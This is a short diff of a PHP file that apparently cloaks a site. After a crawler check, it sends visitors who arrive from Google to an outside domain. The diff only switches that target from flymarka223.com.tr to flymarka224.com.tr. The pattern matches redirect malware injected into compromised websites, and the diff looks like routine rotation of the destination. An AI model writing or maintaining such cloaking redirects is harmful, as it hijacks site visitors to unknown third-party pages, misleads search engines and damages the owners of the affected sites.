@@ -44,7 +44,7 @@ if (is_spider()) {
 }
 
 if (is_from_google()) {
-    header("Location: https://flymarka223.com.tr");
+    header("Location: https://flymarka224.com.tr");
     exit();
 }
 
